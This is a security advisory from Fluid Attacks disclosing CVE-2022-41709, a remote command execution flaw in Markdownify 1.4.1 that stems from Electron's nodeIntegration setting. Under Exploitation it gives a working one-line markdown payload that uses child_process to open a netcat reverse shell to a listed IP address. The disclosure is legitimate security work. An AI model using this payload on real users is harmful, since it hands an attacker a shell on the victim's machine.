---
slug: advisories/adams/
title: Markdownify 1.4.1 - RCE
authors: Carlos Bello
writer: cbello
codename: adams
product: Markdownify 1.4.1 - RCE
date: 2022-10-14 15:30 COT
cveid: CVE-2022-41709
severity: 8.6
description: Markdownify 1.4.1    -    Remote Command Execution
keywords: Fluid Attacks, Security, Vulnerabilities, Markdownify, RCE
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | Markdownify 1.4.1 - RCE                                            |
| **Code name**         | [Adams](https://en.wikipedia.org/wiki/Bryan_Adams)                 |
| **Product**           | Markdownify                                                        |
| **Affected versions** | Version 1.4.1                                                      |
| **State**             | Public                                                             |
| **Release date**      | 2022-10-14                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Remote command execution                                                                                                    |
| **Rule**              | [004. Remote command execution](https://docs.fluidattacks.com/criteria/vulnerabilities/004)                                 |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H                                                                                |
| **CVSSv3 Base Score** | 8.6                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-41709](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41709)                                             |

## Description

Markdownify version 1.4.1 allows an external attacker to execute
arbitrary code remotely on any client attempting to view a malicious
markdown file through Markdownify. This is possible because the
application has the "nodeIntegration" option enabled.

## Vulnerability

This vulnerability occurs because the application has the
"nodeIntegration" option enabled.  Due to the above, an attacker can
embed malicious JS code in a markdown file and send it to the victim
for viewing to achieve an RCE.

## Exploitation

To exploit this vulnerability, the following file must be sent to a
user to be opened with Markdownify.

### exploit.md

```md
<img src=1 onerror="require('child_process').exec('nc 192.168.20.38 4444 -e /bin/bash');"/>
```

## Evidence of exploitation

![rce-markdownify.gif](https://user-images.githubusercontent.com/51862990/195938731-203e6071-b5c1-4258-95ee-0242880f9eb1.gif)

## Our security policy

We have reserved the CVE-2022-41709 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Markdownify 1.4.1

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/amitmerchant1990/electron-markdownify>

## Timeline

<time-lapse
  discovered="2022-09-23"
  contacted="2022-09-23"
  replied="2022-09-23"
  confirmed="2022-09-23"
  patched=""
  disclosure="2022-10-14">
</time-lapse>
